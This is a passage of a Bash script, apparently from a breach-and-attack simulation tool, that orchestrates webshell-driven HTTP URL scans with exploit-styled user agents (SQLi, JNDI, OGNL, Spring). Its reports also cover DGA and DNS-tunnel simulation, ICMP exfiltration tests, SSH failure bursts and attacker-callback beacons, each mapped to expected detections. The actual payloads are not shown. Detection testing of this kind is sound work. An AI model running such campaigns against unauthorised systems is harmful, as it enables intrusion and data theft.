    sanitize_stats_ints attempted responses connected abnormal_ua rare_ua threat_hunt normal_ua payload_ua sqli enc cmd trav jndi ognl spring \
        http_scan_count_failed http_scan_count_success http_scan_count_200 http_scan_count_301 http_scan_count_302 http_scan_count_401 http_scan_count_400 http_scan_count_403 http_scan_count_404 http_scan_count_405 \
        http_scan_count_500 http_scan_real_failed http_scan_synthetic_failed http_scan_redirect_count http_scan_timeout_count \
        propfind options post unique_attempted unique_failed unique_success
    if [[ -z "${stats_line}" || "${attempted}" -eq 0 ]]; then
        append_http_url_scan_debug "${host}" "${port}" "${scheme}" "${base_url}" "${out}" "http-scan-${scheme}-${host}-${port}"
        log_message "WARN" "HTTP URL scan: no stats for ${scheme}://${host}:${port} (transport_ok=${transport_ok}) — slim retry" >&2
        if [[ "${HAS_curl:-false}" == true ]]; then
            out=$(run_webshell_long "http-scan-retry-${scheme}-${host}-${port}" \
                "$(build_http_url_scan_minimal_retry_cmd "${host}" "${port}" "${scheme}" "${CAMPAIGN_ID}")" 2>/dev/null || true)
            ingest_http_attack_remote_output "${out}" "${host}"
            stats_line=$(parse_http_burst_stats_line "${out}")
            read -r scheme_out attempted responses connected abnormal_ua rare_ua threat_hunt normal_ua payload_ua sqli enc cmd trav jndi ognl spring \
                http_scan_count_failed http_scan_count_success http_scan_count_200 http_scan_count_301 http_scan_count_302 http_scan_count_401 http_scan_count_400 http_scan_count_403 http_scan_count_404 http_scan_count_405 \
                http_scan_count_500 http_scan_real_failed http_scan_synthetic_failed http_scan_redirect_count http_scan_timeout_count \
                propfind options post unique_attempted unique_failed unique_success <<< "${stats_line}"
            sanitize_stats_ints attempted responses connected abnormal_ua rare_ua threat_hunt normal_ua payload_ua sqli enc cmd trav jndi ognl spring \
                http_scan_count_failed http_scan_count_success http_scan_count_200 http_scan_count_301 http_scan_count_302 http_scan_count_401 http_scan_count_400 http_scan_count_403 http_scan_count_404 http_scan_count_405 \
                http_scan_count_500 http_scan_real_failed http_scan_synthetic_failed http_scan_redirect_count http_scan_timeout_count \
                propfind options post unique_attempted unique_failed unique_success
        fi
        (( attempted < 1 )) && attempted=1
    fi
    [[ -z "${scheme_out}" ]] && scheme_out="${scheme}"
    printf '%s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s\n' \
        "${scheme_out}" \
        "${attempted}" "${responses}" "${connected}" "${abnormal_ua}" "${rare_ua}" "${threat_hunt}" \
        "${normal_ua}" "${payload_ua}" "${sqli}" "${enc}" "${cmd}" "${trav}" "${jndi}" "${ognl}" "${spring}" \
        "${http_scan_count_failed}" "${http_scan_count_success}" "${http_scan_count_200}" "${http_scan_count_301}" "${http_scan_count_302}" "${http_scan_count_401}" "${http_scan_count_400}" "${http_scan_count_403}" "${http_scan_count_404}" "${http_scan_count_405}" \
        "${http_scan_count_500}" "${http_scan_real_failed}" "${http_scan_synthetic_failed}" "${http_scan_redirect_count}" "${http_scan_timeout_count}" \
        "${propfind}" "${options}" "${post}" \
        "${unique_attempted}" "${unique_failed}" "${unique_success}"
}

lookup_http_burst_target_fields() {
    local host="$1" default_scheme="${2:-http}" default_port="${3:-80}"
    local f line h p s
    for f in reachable_http_targets.txt reachable_https_targets.txt usable_http_targets.txt usable_https_targets.txt http_targets.txt https_targets.txt; do
        [[ -f "${LOCAL_STATE_DIR}/remote_hosts/${f}" ]] || continue
        while IFS= read -r line; do
            [[ -z "${line}" ]] && continue
            if read -r h p s <<< "$(web_target_parse_line "${line}" "${default_scheme}")" && [[ "${h}" == "${host}" ]]; then
                printf '%s %s %s\n' "${h}" "${p}" "${s}"
                return 0
            fi
            if read -r h p s <<< "$(web_target_parse_line "${line}" "https")" && [[ "${h}" == "${host}" ]]; then
                printf '%s %s %s\n' "${h}" "${p}" "${s}"
                return 0
            fi
        done < <(get_local_hosts "${f}" 2>/dev/null | extract_host_file_lines)
    done
    printf '%s %s %s\n' "${host}" "${default_port}" "${default_scheme}"
}

run_http_url_burst_for_host() {
    local host="$1" _req="$2" port scheme
    read -r host port scheme <<< "$(lookup_http_burst_target_fields "${host}")"
    run_http_url_scan_for_target "${host}" "${port}" "${scheme}"
}

format_http_followup_summary_block() {
    cat <<EOF
$(format_intensity_runtime_values_block)

Web Reachability
- HTTP discovered             : ${HTTP_TARGETS_DISCOVERED:-0}
- HTTP reachable              : ${HTTP_TARGETS_REACHABLE:-0}
- HTTP unreachable            : ${HTTP_TARGETS_UNREACHABLE:-0}
- HTTPS discovered            : ${HTTPS_TARGETS_DISCOVERED:-0}
- HTTPS reachable             : ${HTTPS_TARGETS_REACHABLE:-0}
- HTTPS unreachable           : ${HTTPS_TARGETS_UNREACHABLE:-0}
- URL scan selected targets   : ${HTTP_SCAN_TARGET_COUNT:-0}

HTTP/HTTPS URL Scan
- Detection confidence        : ${WEB_DETECTION_CONFIDENCE:-Low}
- planned                     : ${HTTP_REQUESTS_PLANNED:-0}
- attempted                   : ${HTTP_REQUESTS_ATTEMPTED:-0}
- connected                   : ${HTTP_CONNECTED:-0}
- responses (web)             : ${WEB_RESPONSES_RECEIVED:-0}
- HTTP responses              : ${HTTP_RESPONSES_RECEIVED:-0}
- HTTPS responses             : ${HTTPS_RESPONSES_RECEIVED:-0}
- HTTP 400/403/404/405        : ${HTTP_400_COUNT:-0}/${HTTP_403_COUNT:-0}/${HTTP_404_COUNT:-0}/${HTTP_405_COUNT:-0}
- HTTPS 403/404/405           : ${HTTPS_403_COUNT:-0}/${HTTPS_404_COUNT:-0}/${HTTPS_405_COUNT:-0}
- fail ratio                  : ${WEB_FAIL_RATIO:-0}%
- stage status                : ${HTTP_URL_SCAN_STAGE_STATUS:-skipped}

$(format_url_scan_stellar_model_block)

$(format_http_attack_summary_block)

HTTPS URL Scan
- HTTPS responses received  : ${HTTPS_RESPONSES_RECEIVED:-0}
- HTTPS 200/301/302/401     : ${HTTPS_200_COUNT:-0}/${HTTPS_301_COUNT:-0}/${HTTPS_302_COUNT:-0}/${HTTPS_401_COUNT:-0}
- HTTPS 403/404/405         : ${HTTPS_403_COUNT:-0}/${HTTPS_404_COUNT:-0}/${HTTPS_405_COUNT:-0}
- HTTPS failed/success      : ${HTTPS_SCAN_FAILED_RESPONSES:-0}/${HTTPS_SCAN_SUCCESS_RESPONSES:-0}

Combined Web Metrics
- WEB_RESPONSES_RECEIVED    : ${WEB_RESPONSES_RECEIVED:-0}
- WEB_FAILED_RESPONSES      : ${WEB_FAILED_RESPONSES:-0}
- WEB_SUCCESS_RESPONSES     : ${WEB_SUCCESS_RESPONSES:-0}
- WEB_FAIL_RATIO            : ${WEB_FAIL_RATIO:-0}%

Methods & Methods Mix
- PROPFIND count            : ${HTTP_PROPFIND_COUNT:-0}
- POST count                : ${HTTP_POST_COUNT:-0}
- OPTIONS count             : ${HTTP_OPTIONS_COUNT:-0}
- Threat Hunt URL requests  : ${THREAT_HUNT_URL_REQUESTS:-0}

User-Agent Telemetry
- Normal User-Agent count   : ${NORMAL_USER_AGENT_COUNT:-0}
- Rare User-Agent count     : ${RARE_USER_AGENT_COUNT:-0}
- Payload User-Agent count  : ${PAYLOAD_USER_AGENT_COUNT:-0}
- Abnormal User-Agent count : ${ABNORMAL_USER_AGENT_COUNT:-0}
- SQLi-style UA count       : ${UA_SQLI_STYLE_COUNT:-0}
- Traversal-style UA count  : ${UA_TRAVERSAL_STYLE_COUNT:-0}
- Encoding-abuse UA count   : ${UA_ENCODING_ABUSE_COUNT:-0}
- Command-style UA count    : ${UA_COMMAND_STYLE_COUNT:-0}
- JNDI-style UA count       : ${UA_JNDI_STYLE_COUNT:-0}
- OGNL-style UA count       : ${UA_OGNL_STYLE_COUNT:-0}
- Spring-style UA count     : ${UA_SPRING_STYLE_COUNT:-0}

HTTP URL Scan (reachable targets only — recon/suspicious URI patterns)
- Targets                   : reachable_http_targets.txt / reachable_https_targets.txt (IP:PORT)
- Methods                   : GET, HEAD, POST, PROPFIND, OPTIONS
- Wave plan                 : ${HTTP_SCAN_WAVES} waves, unique_url_target=${HTTP_SCAN_UNIQUE_URL_TARGET}, ${HTTP_SCAN_WAVE_SLEEP}s gap
- Follow-up mode            : ${HTTP_FOLLOWUP_MODE}
- Expected HTTP impact      : ${EXPECTED_HTTP_DETECTION_IMPACT}

External Callback (attacker callback / beacon — not URL scan targets)
- Callback base             : ${ATTACKER_BASE_URL}${CALLBACK_PREFIX}
- Attacker port             : ${ATTACKER_PORT}
EOF
}

format_http_followup_capability_block() {
    format_unified_telemetry_capability_summary
}

format_unified_telemetry_capability_summary() {
    dep_yes_no() { if [[ "${1:-false}" == true ]]; then printf 'yes'; else printf 'no'; fi; }
    cat <<EOF
Telemetry Capability Matrix
- curl                      : $(dep_yes_no "${HAS_curl:-false}")
- python3                   : $(dep_yes_no "${HAS_python3:-false}")
- ssh                       : $(dep_yes_no "${HAS_ssh:-false}")
- dig                       : $(dep_yes_no "${HAS_dig:-false}")
- smbclient                 : $(dep_yes_no "${HAS_smbclient:-false}")
- nmap                      : $(dep_yes_no "${HAS_nmap:-false}")
- webshell_method           : ${WEBSHELL_METHOD}
- http_followup_mode        : ${HTTP_FOLLOWUP_MODE}

HTTP
- planned                   : ${HTTP_REQUESTS_PLANNED:-0}
- attempted                 : ${HTTP_REQUESTS_ATTEMPTED:-0}
- connected                 : ${HTTP_CONNECTED:-0}
- responses                 : ${HTTP_RESPONSES_RECEIVED:-0}
- HTTP 403 count            : ${HTTP_403_COUNT:-0}
- HTTP 404 count            : ${HTTP_404_COUNT:-0}
- HTTP 405 count            : ${HTTP_405_COUNT:-0}
- HTTP failed responses     : ${HTTP_SCAN_FAILED_RESPONSES:-0}
- HTTP successful responses : ${HTTP_SCAN_SUCCESS_RESPONSES:-0}
- HTTP fail ratio           : ${HTTP_SCAN_FAIL_RATIO:-0}%
- PROPFIND count            : ${HTTP_PROPFIND_COUNT:-0}
- POST count                : ${HTTP_POST_COUNT:-0}
- OPTIONS count             : ${HTTP_OPTIONS_COUNT:-0}

SSH
- planned                   : ${SSH_ATTEMPTS_PLANNED:-0}
- attempted                 : ${SSH_AUTH_ATTEMPTED:-0}
- auth failures observed    : ${SSH_AUTH_FAILURES_OBSERVED:-0}

DNS (enhanced tunnel)
- planned                   : ${DNS_QUERIES_PLANNED:-0}
- attempted                 : ${DNS_QUERIES_ATTEMPTED:-0}
- effective TLD queries     : ${DNS_EFFECTIVE_TLD_COUNT:-0}
- cluster.local queries     : ${DNS_CLUSTER_LOCAL_COUNT:-0}
- powerapps-style queries   : ${DNS_POWERAPPS_STYLE_COUNT:-0}
- suspicious TLD queries    : ${DNS_SUSPICIOUS_TLD_COUNT:-0}
- HTTPS queries             : ${DNS_HTTPS_QUERY_COUNT:-0}
- entropy-style queries     : ${DNS_TOTAL_ENTROPY_STYLE_COUNT:-0}
- A / TXT / AAAA            : ${DNS_A_QUERIES:-0} / ${DNS_TXT_QUERIES:-0} / ${DNS_AAAA_QUERIES:-0}

DNS New TLD Test
- enabled                   : ${DNS_NEW_TLD_ENABLED}
- resolver                  : ${DNS_NEW_TLD_RESOLVER:-n/a} (source=${DNS_NEW_TLD_RESOLVER_SOURCE:-unknown})
- tested domains            : ${DNS_NEW_TLD_TESTED_DOMAINS:-0}
- unique TLDs               : ${DNS_NEW_TLD_UNIQUE_TLDS:-0}
- query count               : ${DNS_NEW_TLD_QUERY_COUNT:-0}
- successful / failed       : ${DNS_NEW_TLD_SUCCESSFUL_QUERIES:-0} / ${DNS_NEW_TLD_FAILED_QUERIES:-0}
- detection likelihood      : ${DNS_NEW_TLD_DETECTION_LIKELIHOOD:-LOW}
- stage status              : ${DNS_NEW_TLD_STAGE_STATUS:-skipped}
- expected detection        : dns_new_tld / dns_new_tld_sensor (TA0011 / T1071)

DGA Simulation
- enabled                   : ${DGA_SIMULATION_ENABLED}
- resolvable TLD              : ${DGA_RESOLVABLE_TLD:-com}
- resolver                  : ${DGA_DNS_SERVER:-n/a} (source=${DGA_DNS_SOURCE:-unknown})
- total queries             : ${DGA_TOTAL_QUERIES:-0}
- NXDOMAIN count            : ${DGA_NXDOMAIN_COUNT:-0}
- resolvable (with IP)      : ${DGA_RESOLVED_COUNT:-0}
- detection likelihood      : ${DGA_DETECTION_LIKELIHOOD:-LOW}
- stage status              : ${DGA_STAGE_STATUS:-skipped}

ICMP
- planned                   : ${ICMP_PACKETS_PLANNED:-0}
- attempted                 : ${ICMP_PACKETS_ATTEMPTED:-0}
- total packets             : ${ICMP_TOTAL_PACKETS:-0}
- replies received          : ${ICMP_REPLIES_RECEIVED:-0}
- packet loss               : ${ICMP_OVERALL_LOSS:-${ICMP_PACKET_LOSS:-0}}%
- estimated bytes           : ${ICMP_ESTIMATED_BYTES:-0}
- mode                      : ${ICMP_MODE_USED:-${ICMP_TUNNEL_MODE:-payload-size-anomaly}}
- profiles run              : ${ICMP_PROFILES_RUN:-size-anomaly}
- payload avg / min / max   : ${ICMP_PAYLOAD_SIZE_AVG:-0} / ${ICMP_PAYLOAD_SIZE_MIN:-0} / ${ICMP_PAYLOAD_SIZE_MAX:-0}
- largest payload (-s)      : ${ICMP_LARGEST_PAYLOAD_SIZE:-0} (expected total ~${ICMP_LARGEST_EXPECTED_TOTAL_PACKET_SIZE:-0} bytes)
- detection likelihood      : ${ICMP_DETECTION_LIKELIHOOD:-LOW}
- execution result          : ${ICMP_TUNNEL_RESULT:-unknown}
- target                    : ${ICMP_SELECTED_TARGET:-n/a}
- target reachable          : ${ICMP_TARGET_REACHABLE:-unknown}
- webshell exec host        : ${ICMP_WEBSHELL_EXEC_HOST:-unknown}
- payload sizes             : ${ICMP_PAYLOAD_SIZES_USED:-1300-1450}
- duration elapsed          : ${ICMP_TUNNEL_DURATION_ELAPSED:-0}s
- skip reason               : ${ICMP_SKIP_REASON:-none}
- stage status              : ${ICMP_TUNNEL_STAGE_STATUS:-skipped}
- expected detection        : ICMP Based Exfiltration or Tunneling (icmp_tunnel / T1048.003)

External Callback
- attempted                 : ${EXTERNAL_CALLBACK_ATTEMPTED:-0}
- connected                 : ${EXTERNAL_CALLBACK_CONNECTED:-0}
- responses                 : ${EXTERNAL_CALLBACK_RESPONSES:-0}
- beacon cycles             : ${CORRELATION_BEACON_CYCLES:-0}

Internal Web Fanout
- attempted                 : ${INTERNAL_FANOUT_ATTEMPTED:-0}
- connected                 : ${INTERNAL_FANOUT_CONNECTED:-0}
- responses                 : ${INTERNAL_FANOUT_RESPONSES:-0}
- JNDI-style UA (fanout)    : ${FANOUT_UA_JNDI_STYLE_COUNT:-0}
- OGNL-style UA (fanout)    : ${FANOUT_UA_OGNL_STYLE_COUNT:-0}
- Spring-style UA (fanout)  : ${FANOUT_UA_SPRING_STYLE_COUNT:-0}

Non-standard Port
- connections               : ${NONSTANDARD_PORT_CONNECTIONS:-0}
EOF
}

record_discovered_services_snapshot() {
    local f content lines reason cache
    for f in ssh_hosts.txt dns_hosts.txt http_targets.txt https_targets.txt smb_hosts.txt ldap_hosts.txt redis_hosts.txt elastic_hosts.txt mongo_hosts.txt; do
        cache="${LOCAL_STATE_DIR}/remote_hosts/${f}"
        if [[ -s "${cache}" ]]; then
            content=$(awk '/^[0-9]+\./ {print $1}' "${cache}")
        else
            content=$(get_local_hosts "${f}" 2>/dev/null || true)
        fi
        lines=$(count_discovered_ips_in_file "${cache}")
        if [[ "${lines}" == 0 && -n "${content}" ]]; then
            lines=$(safe_int "$(count_hosts_blob "${content}")")
        fi
        if (( lines == 0 )); then
            reason="no open port mapped to ${f} during discovery (nmap/fallback/probe)"
        else
            reason="ok"
        fi
        state_append "discovered_service_files.log" "${f}: count=${lines} status=${reason}"
        if [[ "${VERBOSE}" == true || "${DRY_RUN}" == true ]]; then
            vlog "Discovery file ${f} (${lines}): $(printf '%s' "${content}" | tr '\n' ' ')"
        fi
        if [[ -n "${REPORT_MD}" && "${DRY_RUN}" != true ]]; then
            safe_append_file "${REPORT_MD}" "### Discovered: ${f} (${lines})
\`\`\`
${content:-<empty>}
\`\`\`
" 2>/dev/null || true
        fi
    done
    count_all_discovered_services >/dev/null
}

followup_record_http() {
    local n="${1:-1}"
    FOLLOWUP_HTTP_REQUESTS=$((FOLLOWUP_HTTP_REQUESTS + n))
    FOLLOWUP_ACTIONS_TOTAL=$((FOLLOWUP_ACTIONS_TOTAL + n))
    state_append "followup_http_count.log" "${n}"
}

followup_record_ssh() {
    local n="${1:-1}"
    FOLLOWUP_SSH_AUTH_FAILURES=$((FOLLOWUP_SSH_AUTH_FAILURES + n))
    FOLLOWUP_ACTIONS_TOTAL=$((FOLLOWUP_ACTIONS_TOTAL + n))
    state_append "followup_ssh_count.log" "${n}"
}

followup_record_smb() {
    local n="${1:-1}"
    FOLLOWUP_SMB_PROBES=$((FOLLOWUP_SMB_PROBES + n))
    FOLLOWUP_ACTIONS_TOTAL=$((FOLLOWUP_ACTIONS_TOTAL + n))
    state_append "followup_smb_count.log" "${n}"
}

followup_record_dns() {
    local n="${1:-1}"
    FOLLOWUP_DNS_QUERIES=$((FOLLOWUP_DNS_QUERIES + n))
    FOLLOWUP_ACTIONS_TOTAL=$((FOLLOWUP_ACTIONS_TOTAL + n))
    state_append "followup_dns_count.log" "${n}"
}

count_all_discovered_services() {
    local total=0 f n cache
    for f in ssh_hosts.txt http_targets.txt https_targets.txt smb_hosts.txt ldap_hosts.txt redis_hosts.txt elastic_hosts.txt mongo_hosts.txt dns_hosts.txt; do
        cache="${LOCAL_STATE_DIR}/remote_hosts/${f}"
        if [[ -s "${cache}" ]]; then
            n=$(count_discovered_ips_in_file "${cache}")
        else
            n=$(safe_int "$(count_remote_target_file "${f}")")
        fi
        total=$((total + n))
    done
    SERVICES_DISCOVERED_TOTAL="${total}"
    echo "${total}"
}

collect_http_followup_targets() {
    local kind="$1" raw_file usable_file cache usable_cache merged=""
    case "${kind}" in
        http) raw_file="http_targets.txt"; usable_file="usable_http_targets.txt" ;;
        https) raw_file="https_targets.txt"; usable_file="usable_https_targets.txt" ;;
        *) return 0 ;;
    esac
    cache="${LOCAL_STATE_DIR}/remote_hosts/${raw_file}"
    usable_cache="${LOCAL_STATE_DIR}/remote_hosts/${usable_file}"
    if [[ -s "${cache}" ]]; then
        merged=$(awk '/^[0-9]+\./ {print $1}' "${cache}")
    fi
    if [[ -s "${usable_cache}" ]]; then
        merged=$(printf '%s\n%s' "${merged}" "$(awk '/^[0-9]+\./ {print $1}' "${usable_cache}")")
    fi
    if [[ -z "${merged}" ]]; then
        merged=$(get_followup_hosts "${raw_file}")
    fi
    printf '%s\n' "${merged}"
}

collect_http_followup_targets_unique() {
    collect_http_followup_targets "$1" | awk '/^[0-9]+\./ {print $1}' | sort -u
}

# --- HTTP URL Scan (response-code focused, reachable targets only) ---
followup_stage_http() {
    local scan_targets candidates host port scheme target_line scan_stats scheme_out http_stage_status="Success" http_stage_detail=""
    local main_host="" main_port="" main_scheme=""
    local attempted_total=0 connected_total=0 abnormal_total=0 rare_total=0 threat_total=0
    local normal_total=0 payload_total=0 sqli_total=0 enc_total=0 cmd_total=0 trav_total=0 jndi_total=0 ognl_total=0 spring_total=0
    local propfind_total=0 options_total=0 post_total=0
    local scan_attempted scan_responses scan_connected abnormal_ua rare_ua threat_hunt normal_ua payload_ua sqli enc cmd trav jndi ognl spring
    local http_scan_count_failed http_scan_count_success http_scan_count_200 http_scan_count_301 http_scan_count_302 http_scan_count_401 http_scan_count_400 http_scan_count_403 http_scan_count_404 http_scan_count_405 propfind options post
    local http_scan_count_500=0 http_scan_count_timeout=0 http_scan_fail_ratio=0
    local unique_attempted unique_failed unique_success
    local unique_attempted_total=0 unique_failed_total=0 unique_success_total=0
    local main_total=0 main_failed=0 main_success=0 main_fail_ratio=0 main_400=0 main_403=0 main_404=0 main_timeout=0
    local main_burst_elapsed=0

    if [[ ! -s "${LOCAL_STATE_DIR}/remote_hosts/reachable_http_targets.txt" && ! -s "${LOCAL_STATE_DIR}/remote_hosts/reachable_https_targets.txt" ]]; then
        stage_validate_web_reachability || true
    fi

    poc_obs_stage_start "HTTP Follow-up"
    add_executed_stage "HTTP/HTTPS Follow-up"
    resolve_http_followup_mode
    resolve_http_scan_wave_plan
    write_report_entries "http_followup" "T1595.002" "NDR/WAF" "HTTP URL Scan" "multi" "start" "response-code scan intensity=${FOLLOWUP_INTENSITY} mode=${HTTP_FOLLOWUP_MODE}"

    candidates=$(collect_http_url_scan_candidates)
    if select_http_url_scan_concentrated_target "${candidates}" >/dev/null; then
        read -r main_host main_port main_scheme <<< "${HTTP_URL_SCAN_SELECTION_LINE}"
        scan_targets="${main_host} ${main_port} ${main_scheme}"
    else
        scan_targets=""
    fi
    sync_url_scan_selected_target_count "${scan_targets}"
    HTTP_REQUESTS_PLANNED=0
    if (( HTTP_SCAN_TARGET_COUNT > 0 )); then
        HTTP_REQUESTS_PLANNED="${HTTP_SCAN_UNIQUE_URL_TARGET}"
    fi
    HTTP_REQUESTS_ATTEMPTED=0
    URL_SCAN_UNIQUE_ATTEMPTED=0
    URL_SCAN_UNIQUE_FAILED=0
    URL_SCAN_UNIQUE_SUCCESS=0
    URL_SCAN_UNIQUE_FAIL_RATIO=0
    URL_SCAN_ANOMALY_SCORE=0
    HTTP_CONNECTED=0
    HTTP_RESPONSES_RECEIVED=0
    HTTPS_RESPONSES_RECEIVED=0
    HTTPS_CONNECTED=0
    HTTPS_REQUESTS_ATTEMPTED=0
    ABNORMAL_USER_AGENT_COUNT=0
    RARE_USER_AGENT_COUNT=0
    NORMAL_USER_AGENT_COUNT=0
    PAYLOAD_USER_AGENT_COUNT=0
    UA_SQLI_STYLE_COUNT=0
    UA_ENCODING_ABUSE_COUNT=0
    UA_COMMAND_STYLE_COUNT=0
    UA_TRAVERSAL_STYLE_COUNT=0
    UA_JNDI_STYLE_COUNT=0
    UA_OGNL_STYLE_COUNT=0
    UA_SPRING_STYLE_COUNT=0
    THREAT_HUNT_URL_REQUESTS=0
    HTTP_200_COUNT=0 HTTP_301_COUNT=0 HTTP_302_COUNT=0 HTTP_401_COUNT=0
    HTTP_400_COUNT=0 HTTP_403_COUNT=0 HTTP_404_COUNT=0 HTTP_405_COUNT=0
    HTTPS_400_COUNT=0
    HTTPS_200_COUNT=0 HTTPS_301_COUNT=0 HTTPS_302_COUNT=0 HTTPS_401_COUNT=0
    HTTPS_403_COUNT=0 HTTPS_404_COUNT=0 HTTPS_405_COUNT=0
    HTTP_SCAN_FAILED_RESPONSES=0 HTTP_SCAN_SUCCESS_RESPONSES=0
    HTTPS_SCAN_FAILED_RESPONSES=0 HTTPS_SCAN_SUCCESS_RESPONSES=0
    HTTP_PROPFIND_COUNT=0 HTTP_OPTIONS_COUNT=0 HTTP_POST_COUNT=0
    reset_http_attack_metrics
    log_http_ua_policy_local url_scan

    if (( HTTP_SCAN_TARGET_COUNT > 0 )); then
        log_http_detection_window_bundle "${HTTP_URL_SCAN_SELECTED_TARGET:-none}" "0" plan
    fi

    log_message "OK" "HTTP URL Scan planning (External URL Reconnaissance profile):
    HTTP discovered=${HTTP_TARGETS_DISCOVERED:-0} HTTP reachable=${HTTP_TARGETS_REACHABLE:-0}
    HTTPS discovered=${HTTPS_TARGETS_DISCOVERED:-0} HTTPS reachable=${HTTPS_TARGETS_REACHABLE:-0}
    URL scan candidates=${HTTP_URL_SCAN_CANDIDATE_COUNT:-0} concentrated target=1 selected=${HTTP_URL_SCAN_SELECTED_TARGET:-none}
    unique_url_target=${HTTP_SCAN_UNIQUE_URL_TARGET} (min 40, recommended>=${HTTP_SCAN_UNIQUE_URL_RECOMMENDED})
    detection_window=${HTTP_SCAN_WINDOW_SECONDS}s (Stellar ${DETECTION_WINDOW_BUCKET_SECONDS}s bucket — single-target burst)
    waves=${HTTP_SCAN_WAVES} wave_sleep=${HTTP_SCAN_WAVE_SLEEP}s inter_sleep=${HTTP_SCAN_INTER_REQUEST_SLEEP}s attempt_cap=${HTTP_SCAN_WAVE_ATTEMPT_CAP}
    recon_fail_target: unique_failed>=${HTTP_SCAN_RECON_MIN_FAILED} fail_ratio>=${HTTP_SCAN_RECON_MIN_FAIL_RATIO}%
    paths=sensitive/non-existent + bad query (400/404/403 mix)
    degraded_fallback=${URL_SCAN_DEGRADED_FALLBACK:-false}"
    [[ "${URL_SCAN_DEGRADED_FALLBACK}" == true ]] && \
        log_message "WARN" "URL Scan using degraded fallback targets"

    if (( HTTP_SCAN_TARGET_COUNT == 0 )); then
        HTTP_URL_SCAN_STAGE_STATUS="skipped"
        poc_obs_record_followup "HTTP URL Scan" "n/a" "0" "not_found" "http" "n/a" "0" "no reachable HTTP/HTTPS targets" \
            "unknown" false false "" "0" "0" || true
        log_message "WARN" "URL Scan skipped: no reachable HTTP/HTTPS targets (decision=skipped_config_missing)"
        set_stage_result "HTTP/HTTPS Follow-up" "Skipped" "no reachable HTTP/HTTPS targets"
        write_report_entries "http_followup" "T1595.002" "NDR/WAF" "HTTP URL Scan" "multi" "skipped" "no reachable targets"
        save_http_url_scan_overlap_result
        return 0
    fi

    state_append "followup_http_planned.log" "candidates=${HTTP_URL_SCAN_CANDIDATE_COUNT:-0} selected=${HTTP_URL_SCAN_SELECTED_TARGET:-none} unique_url_target=${HTTP_SCAN_UNIQUE_URL_TARGET} waves=${HTTP_SCAN_WAVES} mode=${HTTP_FOLLOWUP_MODE}"

    if [[ "${DRY_RUN}" == true ]]; then
        local http_idx=0
        http_total=$(printf '%s\n' "${candidates}" | awk 'NF{c++} END{print c+0}')
        while IFS= read -r target_line; do
            [[ -z "${target_line}" ]] && continue
            if [[ "${target_line}" == *" "* ]]; then
                read -r host port scheme <<< "${target_line}"
            elif read -r host port scheme <<< "$(web_target_parse_line "${target_line}" "http" 2>/dev/null)"; then
                :
            elif read -r host port scheme <<< "$(web_target_parse_line "${target_line}" "https" 2>/dev/null)"; then
                :
            else
                continue
            fi
            read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
            http_idx=$((http_idx + 1))
            poc_obs_log "INFO" "HTTP Follow-up Progress: ${http_idx}/${http_total} targets processed"
            if [[ "${host}" == "${main_host}" && "${port}" == "${main_port}" && "${scheme}" == "${main_scheme}" ]]; then
                precheck_line=$(poc_precheck_http "${scheme}://${host}:${port}/")
                poc_precheck_read_line "${precheck_line}" precheck_cmd precheck_ec precheck_out classification
                poc_obs_record_followup "HTTP URL Scan" "${host}" "${port}" "open" "${scheme}" \
                    "${precheck_cmd}" "${precheck_ec}" "${precheck_out}" "${classification}" true true \
                    "run_http_url_scan_for_target (dry-run)" "0" "0" >/dev/null
            else
                poc_obs_record_followup "HTTP URL Scan" "${host}" "${port}" "open" "${scheme}" \
                    "auxiliary_probe_only" "0" "selection_probe_only" "connected" false false \
                    "auxiliary_probe_only (no main burst)" "0" "0" >/dev/null
            fi
        done <<< "${candidates}"
        poc_obs_stage_end "HTTP Follow-up"
        simulate_http_scan_response_metrics "${HTTP_REQUESTS_PLANNED}"
        simulate_http_attack_metrics "${HTTP_REQUESTS_PLANNED}"
        HTTP_REQUESTS_ATTEMPTED="${HTTP_REQUESTS_PLANNED}"
        URL_SCAN_UNIQUE_ATTEMPTED="${HTTP_SCAN_UNIQUE_URL_TARGET}"
        simulate_url_scan_unique_metrics "${URL_SCAN_UNIQUE_ATTEMPTED}"
        HTTP_RESPONSES_RECEIVED=$((HTTP_SCAN_FAILED_RESPONSES + HTTP_SCAN_SUCCESS_RESPONSES))
        HTTPS_RESPONSES_RECEIVED=$((HTTP_RESPONSES_RECEIVED / 3))
        HTTP_RESPONSES_RECEIVED=$((HTTP_RESPONSES_RECEIVED - HTTPS_RESPONSES_RECEIVED))
        HTTP_CONNECTED="${HTTP_RESPONSES_RECEIVED}"
        HTTPS_CONNECTED="${HTTPS_RESPONSES_RECEIVED}"
        THREAT_HUNT_URL_REQUESTS="${HTTP_REQUESTS_ATTEMPTED}"
        HTTP_PROPFIND_COUNT=$((HTTP_REQUESTS_PLANNED / 8 + 1))
        HTTP_POST_COUNT=$((HTTP_REQUESTS_PLANNED / 6 + 1))
        HTTP_OPTIONS_COUNT=$((HTTP_REQUESTS_PLANNED / 10 + 1))
        sync_web_combined_metrics
        {
            local dr_real dr_synthetic dr_redirect dr_success
            dr_real=$((HTTP_400_COUNT + HTTP_401_COUNT + HTTP_403_COUNT + HTTP_404_COUNT + HTTP_405_COUNT))
            dr_synthetic=$((URL_SCAN_UNIQUE_FAILED - dr_real))
            (( dr_synthetic < 0 )) && dr_synthetic=0
            dr_redirect=$((HTTP_301_COUNT + HTTP_302_COUNT))
            dr_success="${HTTP_200_COUNT:-0}"
            log_http_url_scan_final_summary "${HTTP_URL_SCAN_SELECTED_TARGET:-none}" "${HTTP_REQUESTS_PLANNED}" \
                "${dr_success}" "${dr_real}" "${dr_synthetic}" "${dr_redirect}" \
                "${HTTP_400_COUNT:-0}" "${HTTP_401_COUNT:-0}" "${HTTP_403_COUNT:-0}" "${HTTP_404_COUNT:-0}" "${HTTP_405_COUNT:-0}" "0" "0"
            compute_http_ua_detection_likelihoods
            log_http_ua_coverage_aggregate
            log_http_detection_window_bundle "${HTTP_URL_SCAN_SELECTED_TARGET:-none}" "${HTTP_SCAN_WINDOW_SECONDS}" summary
        }
        compute_web_detection_confidence
        sync_http_followup_counter_aliases
        followup_record_http "${HTTP_REQUESTS_ATTEMPTED}"
        HTTP_URL_SCAN_STAGE_STATUS="success"
        log_message "OK" "$(format_url_scan_stellar_model_block)"
        set_stage_result "HTTP/HTTPS Follow-up" "Success" "dry-run concentrated scan on ${HTTP_URL_SCAN_SELECTED_TARGET:-none}"
